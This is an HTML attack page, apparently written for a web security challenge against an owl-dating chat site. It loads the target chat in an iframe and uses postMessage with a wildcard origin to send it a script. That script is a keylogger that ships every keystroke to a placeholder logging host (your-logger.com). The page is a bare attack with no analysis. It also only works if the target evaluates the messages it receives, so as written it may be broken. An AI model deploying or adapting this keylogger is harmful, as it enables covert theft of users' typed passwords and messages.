<!DOCTYPE html>
<html>
<head>
  <title>Owley Madison - SWAG Challenge</title>
</head>
<body>
  <h1>Welcome Owls ðŸ¦‰</h1>
  <p>This is the future of owl dating.</p>

  <!-- Load the chat page in an iframe -->
  <iframe id="chatFrame" src="https://chat.owley.websec.saarland/" width="800" height="600"></iframe>

  <script>
    // Wait until the iframe loads
    const iframe = document.getElementById("chatFrame");

    iframe.onload = function() {
      try {
        // Inject a keylogger using postMessage
        iframe.contentWindow.postMessage(`
          (function(){
            document.addEventListener('keydown', function(e) {
              fetch('https://your-logger.com/log?key=' + encodeURIComponent(e.key));
            });
          })();
        `, '*'); // * allows to send to any origin
      } catch (e) {
        console.error("Error injecting:", e);
      }
    };

    // Listen for messages if needed
    window.addEventListener("message", function(event) {
      console.log("Message received:", event.data);
    });
  </script>
</body>
</html>
